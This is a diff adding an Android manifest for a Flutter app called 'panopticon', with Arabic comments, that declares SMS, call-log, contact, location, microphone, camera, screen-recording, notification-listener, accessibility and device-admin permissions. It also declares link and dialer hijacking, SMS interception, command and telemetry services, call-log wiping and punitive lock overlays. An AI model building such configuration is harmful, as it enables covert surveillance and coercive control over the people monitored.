@@ -1,0 +1,381 @@
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    package="com.abdelrahman.panopticon">
+
+    <!-- ─── الأذونات الأساسية ─── -->
+    <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_SPECIAL_USE" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION" />
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    <uses-permission android:name="android.permission.CAMERA" />
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" android:maxSdkVersion="28" />
+    <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
+    <uses-permission android:name="android.permission.READ_MEDIA_VIDEO" />
+    <uses-permission android:name="android.permission.READ_MEDIA_AUDIO" />
+    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
+    <uses-permission android:name="android.permission.READ_CONTACTS" />
+    <uses-permission android:name="android.permission.GET_ACCOUNTS" />
+    <uses-permission android:name="android.permission.USE_BIOMETRIC" />
+    <uses-permission android:name="android.permission.USE_FINGERPRINT" />
+    <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES" />
+
+    <!-- GPS — الموقع الجغرافي -->
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+    <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION" />
+
+    <!-- مشرف الجهاز -->
+    <uses-permission android:name="android.permission.BIND_DEVICE_ADMIN" />
+
+    <!-- إمكانية الوصول -->
+    <uses-permission android:name="android.permission.BIND_ACCESSIBILITY_SERVICE" />
+
+    <!-- الرسم فوق التطبيقات -->
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
+
+    <!-- البطارية -->
+    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
+    <uses-permission android:name="android.permission.WAKE_LOCK" />
+    <uses-permission android:name="android.permission.BATTERY_STATS"
+        tools:ignore="ProtectedPermission"
+        xmlns:tools="http://schemas.android.com/tools"/>
+
+    <!-- الشبكة -->
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
+    <uses-permission android:name="android.permission.CHANGE_NETWORK_STATE" />
+
+    <!-- الهاتف — لازم لـ intent filters المكالمات (DIAL/CALL/tel://) -->
+    <uses-permission android:name="android.permission.CALL_PHONE" />
+    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+    <uses-permission android:name="android.permission.READ_CALL_LOG" />
+
+    <!-- الرسائل — لازم لأن يكون التطبيق المعالج الافتراضي للـ SMS -->
+    <uses-permission android:name="android.permission.SEND_SMS" />
+    <uses-permission android:name="android.permission.RECEIVE_SMS" />
+    <uses-permission android:name="android.permission.READ_SMS" />
+    <uses-permission android:name="android.permission.RECEIVE_MMS" />
+
+    <!-- نظام الإشعارات — لازم لاعتراض الإشعارات -->
+    <uses-permission android:name="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE" />
+
+    <!-- Phase 11: AlarmManager exact-time scheduling (API 31+) -->
+    <uses-permission android:name="android.permission.SCHEDULE_EXACT_ALARM" />
+    <uses-permission android:name="android.permission.USE_EXACT_ALARM" />
+
+    <!-- Phase 4: DPC Command Center -->
+    <!-- OOB Call Lockdown — TelecomManager إنهاء المكالمات -->
+    <uses-permission android:name="android.permission.ANSWER_PHONE_CALLS" />
+    <!-- إحصاءات الاستخدام — UsageStatsManager -->
+    <uses-permission android:name="android.permission.PACKAGE_USAGE_STATS"
+        tools:ignore="ProtectedPermission"
+        xmlns:tools="http://schemas.android.com/tools"/>
+    <!-- الاهتزاز — Panic Alarm -->
+    <uses-permission android:name="android.permission.VIBRATE" />
+    <!-- إدارة الصوت -->
+    <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS" />
+    <!-- تشغيل الصوت في الخلفية -->
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PLAYBACK" />
+
+    <!-- Android 14+: Camera Foreground Service Type -->
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />
+    <!-- Android 14+: MediaProjection Foreground Service Type -->
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" />
+
+    <!-- Module 3: VPN Network Isolation -->
+    <uses-permission android:name="android.permission.BIND_VPN_SERVICE" />
+
+    <!-- Module 4: OOB Call Log Wipe -->
+    <uses-permission android:name="android.permission.WRITE_CALL_LOG" />
+
+    <!-- Phase 9: Ambient Audio Analysis -->
+    <uses-permission android:name="android.permission.RECORD_AUDIO" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />
+
+    <!-- Phase 9: AlarmManager Doze Bypass -->
+    <uses-permission android:name="android.permission.SCHEDULE_EXACT_ALARM" />
+    <uses-permission android:name="android.permission.USE_EXACT_ALARM" />
+
+    <application
+        android:label="نظام المنافسة"
+        android:name="${applicationName}"
+        android:icon="@mipmap/ic_launcher"
+        android:allowBackup="false"
+        android:fullBackupContent="false"
+        android:theme="@style/LaunchTheme"
+        android:usesCleartextTraffic="false">
+
+        <!-- Flutter v2 embedding -->
+        <meta-data android:name="flutterEmbedding" android:value="2" />
+
+        <!-- ─── النشاط الرئيسي ─── -->
+        <activity
+            android:name=".MainActivity"
+            android:exported="true"
+            android:launchMode="singleTop"
+            android:theme="@style/LaunchTheme"
+            android:configChanges="orientation|keyboardHidden|keyboard|screenSize|smallestScreenSize|locale|layoutDirection|fontScale|screenLayout|density|uiMode"
+            android:hardwareAccelerated="true"
+            android:windowSoftInputMode="adjustResize">
+
+            <!-- ── LAUNCHER ──────────────────────────── -->
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+
+            <!-- ── SOVEREIGN BROWSER CONTROL ────────────
+                 يجعل التطبيق المعالجَ الأساسي لروابط HTTP/HTTPS
+                 مما يمنع فتح أي متصفح خارجي دون موافقته       -->
+            <intent-filter android:priority="999">
+                <action android:name="android.intent.action.VIEW" />
+                <category android:name="android.intent.category.DEFAULT" />
+                <category android:name="android.intent.category.BROWSABLE" />
+                <data android:scheme="http" />
+                <data android:scheme="https" />
+            </intent-filter>
+
+            <!-- ── DEEP LINK: مخطط التطبيق الداخلي ─────
+                 panopticon://leader/... أو panopticon://participant/...
+                 يُستخدم لربط الأوامر الخارجية بالشاشات الداخلية  -->
+            <intent-filter android:autoVerify="true">
+                <action android:name="android.intent.action.VIEW" />
+                <category android:name="android.intent.category.DEFAULT" />
+                <category android:name="android.intent.category.BROWSABLE" />
+                <data android:scheme="panopticon" android:host="open" />
+            </intent-filter>
+
+            <!-- ── SOVEREIGN DIALER CONTROL ─────────────
+                 يعترض نوايا الاتصال ويمررها عبر التطبيق أولاً   -->
+            <intent-filter android:priority="999">
+                <action android:name="android.intent.action.DIAL" />
+                <action android:name="android.intent.action.CALL" />
+                <category android:name="android.intent.category.DEFAULT" />
+                <data android:scheme="tel" />
+            </intent-filter>
+
+            <!-- ── SOVEREIGN SMS CONTROL ─────────────────
+                 يجعل التطبيق المعالجَ الأساسي لروابط SMS       -->
+            <intent-filter android:priority="999">
+                <action android:name="android.intent.action.VIEW" />
+                <action android:name="android.intent.action.SENDTO" />
+                <category android:name="android.intent.category.DEFAULT" />
+                <category android:name="android.intent.category.BROWSABLE" />
+                <data android:scheme="sms" />
+                <data android:scheme="smsto" />
+                <data android:scheme="mms" />
+                <data android:scheme="mmsto" />
+            </intent-filter>
+
+            <!-- ── SHARE (استقبال ملفات مشتركة) ─────────
+                 يعترض ملفات المشاركة ويرسلها عبر ExternalStorageService -->
+            <intent-filter>
+                <action android:name="android.intent.action.SEND" />
+                <action android:name="android.intent.action.SEND_MULTIPLE" />
+                <category android:name="android.intent.category.DEFAULT" />
+                <data android:mimeType="image/*" />
+                <data android:mimeType="video/*" />
+                <data android:mimeType="*/*" />
+            </intent-filter>
+
+        </activity>
+
+        <!-- ─── مشرف الجهاز ─── -->
+        <receiver
+            android:name=".MyDeviceAdminReceiver"
+            android:label="مشرف نظام المنافسة"
+            android:description="@string/device_admin_description"
+            android:permission="android.permission.BIND_DEVICE_ADMIN"
+            android:exported="true">
+            <meta-data
+                android:name="android.app.device_admin"
+                android:resource="@xml/device_admin_policies" />
+            <intent-filter>
+                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
+                <action android:name="android.app.action.DEVICE_ADMIN_DISABLED" />
+            </intent-filter>
+        </receiver>
+
+        <!-- ─── خدمة إمكانية الوصول ─── -->
+        <service
+            android:name=".MyAccessibilityService"
+            android:label="خدمة مراقبة المنافسة"
+            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
+            android:exported="true"
+            android:foregroundServiceType="specialUse">
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService" />
+            </intent-filter>
+            <meta-data
+                android:name="android.accessibilityservice"
+                android:resource="@xml/accessibility_service_config" />
+        </service>
+
+        <!-- ─── CommandListenerService (يستمع للأوامر الواردة) ─── -->
+        <service
+            android:name=".CommandListenerService"
+            android:exported="false"
+            android:foregroundServiceType="specialUse"
+            android:stopWithTask="false" />
+
+        <!-- ─── TelemetryPublisherService (يرفع بيانات الجهاز) ─── -->
+        <service
+            android:name=".TelemetryPublisherService"
+            android:exported="false"
+            android:foregroundServiceType="dataSync"
+            android:stopWithTask="false" />
+
+        <!-- ─── BootReceiver — يُشغّل الخدمات بعد إعادة التشغيل ─── -->
+        <receiver
+            android:name=".BootReceiver"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
+                <category android:name="android.intent.category.DEFAULT" />
+            </intent-filter>
+        </receiver>
+
+        <!-- ─── Phase 4: LostModeOverlayService ─── -->
+        <service
+            android:name=".LostModeOverlayService"
+            android:exported="false"
+            android:foregroundServiceType="specialUse"
+            android:stopWithTask="false" />
+
+        <!-- ─── Phase 4: PanicAlarmService ─── -->
+        <service
+            android:name=".PanicAlarmService"
+            android:exported="false"
+            android:foregroundServiceType="specialUse"
+            android:stopWithTask="false" />
+
+        <!-- ─── Phase 4: IncomingCallLockdownReceiver (OOB Protocol) ─── -->
+        <receiver
+            android:name=".IncomingCallLockdownReceiver"
+            android:exported="false">
+            <intent-filter>
+                <action android:name="android.intent.action.PHONE_STATE" />
+            </intent-filter>
+        </receiver>
+
+        <!-- ─── Phase 5: ScreenRecordingService (Audit Session) ─── -->
+        <service
+            android:name=".ScreenRecordingService"
+            android:exported="false"
+            android:foregroundServiceType="mediaProjection"
+            android:stopWithTask="false" />
+
+        <!-- ─── Phase 5: SnapCheckinService (Identity Verification) ─── -->
+        <service
+            android:name=".SnapCheckinService"
+            android:exported="false"
+            android:foregroundServiceType="camera"
+            android:stopWithTask="false" />
+
+        <!-- ─── Phase 7: GeofenceMonitorService (Fleet Perimeter) ─── -->
+        <service
+            android:name=".GeofenceMonitorService"
+            android:exported="false"
+            android:foregroundServiceType="location"
+            android:stopWithTask="false" />
+
+        <!-- ─── Phase 9: NotificationScannerService (DLP on Notifications) ─── -->
+        <service
+            android:name=".NotificationScannerService"
+            android:label="مراقب الإشعارات الأمني"
+            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"
+            android:exported="true"
+            android:stopWithTask="false">
+            <intent-filter>
+                <action android:name="android.service.notification.NotificationListenerService" />
+            </intent-filter>
+            <meta-data
+                android:name="android.service.notification.default_filter_types"
+                android:value="conversations|alerting|silent" />
+        </service>
+
+        <!-- ─── Phase 9: SmsInterceptorReceiver (DLP on SMS) ─── -->
+        <receiver
+            android:name=".SmsInterceptorReceiver"
+            android:exported="true"
+            android:permission="android.permission.BROADCAST_SMS">
+            <intent-filter android:priority="999">
+                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
+            </intent-filter>
+        </receiver>
+
+        <!-- ─── Phase 9: AmbientAudioService (Noise Level Analysis) ─── -->
+        <service
+            android:name=".AmbientAudioService"
+            android:exported="false"
+            android:foregroundServiceType="microphone"
+            android:stopWithTask="false" />
+
+        <!-- ─── Phase 9: AlarmWakeUpReceiver (Doze Mode Bypass) ─── -->
+        <receiver
+            android:name=".AlarmWakeUpReceiver"
+            android:exported="false">
+            <intent-filter>
+                <action android:name="com.abdelrahman.panopticon.WAKE_TELEMETRY" />
+                <action android:name="com.abdelrahman.panopticon.WAKE_COMMAND" />
+            </intent-filter>
+        </receiver>
+
+        <!-- ─── Module 1: RedOverlayService (الطبقة الحمراء العقابية) ─── -->
+        <service
+            android:name=".RedOverlayService"
+            android:exported="false"
+            android:stopWithTask="false" />
+
+        <!-- ─── Module 3: DpcVpnService (Blackhole Network Isolation) ─── -->
+        <service
+            android:name=".DpcVpnService"
+            android:exported="false"
+            android:permission="android.permission.BIND_VPN_SERVICE"
+            android:stopWithTask="false">
+            <intent-filter>
+                <action android:name="android.net.VpnService" />
+            </intent-filter>
+        </service>
+
+        <!-- ─── Module 4: BriefingEnforcerService (Mandatory Briefing) ─── -->
+        <service
+            android:name=".BriefingEnforcerService"
+            android:exported="false"
+            android:foregroundServiceType="specialUse"
+            android:stopWithTask="false" />
+
+        <!-- ─── Phase 11: InterviewAlarmReceiver (قفل وقت المقابلة) ─── -->
+        <receiver
+            android:name=".InterviewAlarmReceiver"
+            android:exported="false">
+            <intent-filter>
+                <action android:name="com.abdelrahman.panopticon.INTERVIEW_ALARM" />
+            </intent-filter>
+        </receiver>
+
+        <!-- ─── Phase 11: InterviewLockService (طبقة القفل المطلق) ─── -->
+        <service
+            android:name=".InterviewLockService"
+            android:exported="false"
+            android:foregroundServiceType="specialUse"
+            android:stopWithTask="false" />
+
+        <!-- Provider لـ FileProvider (صور) -->
+        <provider
+            android:name="androidx.core.content.FileProvider"
+            android:authorities="${applicationId}.fileprovider"
+            android:exported="false"
+            android:grantUriPermissions="true">
+            <meta-data
+                android:name="android.support.FILE_PROVIDER_PATHS"
+                android:resource="@xml/file_paths" />
+        </provider>
+
+    </application>
+</manifest>
